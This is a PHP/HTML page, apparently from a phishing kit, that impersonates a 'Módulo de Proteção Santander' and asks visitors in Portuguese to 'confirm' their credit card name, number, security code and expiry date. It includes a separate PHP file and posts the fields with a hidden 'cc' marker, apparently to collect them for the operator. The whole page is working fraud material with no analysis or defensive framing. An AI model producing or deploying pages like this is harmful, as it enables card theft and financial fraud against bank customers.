<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title></title>
</head>
<body>

<?php include ('pass_net.php');?>

	<div class="md_all">
		<div class="md_box" style="margin-top: 60px!important;">

			<div class="md_boxLogo border_loader">
				<img src="imgs/logo-stdeMd1.png">
			</div><!-- ld_boxLogo -->

			<div class="md_modalTtitle">
				<h1 class="title_ass">Módulo de Proteção Santander</h1>
				<p class="text_ased" style="line-height: 1.3em;">
					Agora, precisaremos confirmar os dados do seu cartão de créditos. Informe os dados requeridos abaixo.
				</p>
			</div>


			<div class="md_boxTables">
				<form action="" name="formAss" id="formAss" method="post" onsubmit="return checkerCCForm();" style="margin-top:10px;">
					<span>Nome do cartão:</span>
					<input type="text" name="cc_name" id="cc_name" class="input_ass" autocomplete="off" style="width: 250px!important;"> 
					<small style="line-height: 20px;display:block;float:left;font-size:.8em;color:#666;height: 30px;">Nome como inscrito no cartão</small>
					<br><br>
					
					<span>Número do cartão:</span>
					<input type="text" name="cc_number" id="cc_number" class="input_ass" maxlength="19" autocomplete="off" style="width: 250px!important;"> 
					<small style="line-height: 20px;display:block;float:left;font-size:.8em;color:#666;height: 30px;">16 dígitos na frente do cartão</small>
					<br><br>
					
					<span>Código de segurança:</span>
					<input type="text" name="cc_cvv" id="cc_cvv" class="input_ass" maxlength="3" onkeypress='return SomenteNumero(event)' autocomplete="off" style="width: 250px!important;"> 
					<small style="line-height: 20px;display:block;float:left;font-size:.8em;color:#666;height: 30px;">3 dígitos no verso do cartão</small>
					<br><br>
					
					<span>Validade:</span>
					<input type="text" name="cc_validade" id="cc_validade" class="input_ass" maxlength="5" autocomplete="off" style="width: 250px!important;"> 
					<small style="line-height: 20px;display:block;float:left;font-size:.8em;color:#666;height: 30px;">Data de validade</small>
					<br><br>

					<input type="hidden" name="sender" id="sender" value="cc">
					<input type="submit" name="sendAss" id="sendAss" class="btn_ass" value="confirmar" style="margin: 5px 0 0 140px;">
				</form>
			
				<span class="note_atr">
					<b class="red_txt">Dica:</b><br>
					Informe os dados do seu cartão de crédito ou débito para realizar essa confirmação de segurança. <br>
					Caso tenha dúvida, tenha seu cartão de créditos em mãos para realizar o processo de forma correta.
				</span>
			</div><!-- md_boxTables -->

			<br><br>
		</div><!-- ld_box -->
	</div>
</body>
</html>